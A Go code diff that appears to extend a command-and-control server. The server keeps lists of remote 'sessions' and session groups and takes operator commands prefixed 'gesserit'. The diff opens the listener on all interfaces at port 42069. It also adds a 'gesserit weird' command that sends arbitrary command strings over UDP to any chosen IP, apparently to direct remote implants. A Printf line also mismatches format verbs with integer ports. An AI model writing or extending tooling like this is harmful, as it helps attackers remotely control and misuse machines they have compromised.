@@ -10,7 +10,7 @@ import (
 )
 
 const (
-	HOST = "192.168.172.1"
+	HOST = "0.0.0.0"
 	PORT = "42069"
 	TYPE = "tcp"
 )
@@ -101,6 +101,31 @@ func print_group(sessions []session){
 	}
 }
 
+func send_udp(ip string, command string){
+    src_port := 42069  
+    target_port := 42069
+    targetAddr, err := net.ResolveUDPAddr("udp", ip+":"+strconv.Itoa(target_port))
+    if err != nil {
+		fmt.Println("Failed to resolve target address:", err)
+	}
+    sourceAddr, err := net.ResolveUDPAddr("udp", ":"+strconv.Itoa(src_port))
+	if err != nil {
+		fmt.Println("Failed to resolve source address:", err)
+	}
+    conn, err := net.DialUDP("udp", sourceAddr, targetAddr)
+	if err != nil {
+		fmt.Println("Failed to create UDP connection:", err)
+	}
+	defer conn.Close()
+
+    _, err = conn.Write([]byte(command))
+	if err != nil {
+		fmt.Println("Failed to send UDP packet:", err)
+	} else {
+		fmt.Printf("UDP packet sent from port %s to %s:%s with data: %s\n", src_port, ip, target_port, command)
+	}
+}
+
 func main() {
 
 	currentSession := 0
@@ -131,7 +156,14 @@ func main() {
 			list_sessions(sessions, currentSession)
 		} else if cmd == "gesserit grouplist\n" {
 			print_group(groupSessionList)
-		} else if strings.Contains(cmd, "gesserit add"){
+		} else if strings.Contains(cmd, "gesserit weird"){
+            st := strings.Fields(cmd)
+            if len(st) >= 3 {
+                ip := st[2]
+                command_to_send := strings.Join(st[3:], " ")
+                send_udp(ip, command_to_send)  
+            }
+        } else if strings.Contains(cmd, "gesserit add"){
 			st := strings.Fields(cmd)
 			s, err := strconv.Atoi(st[2])
 			if err != nil {
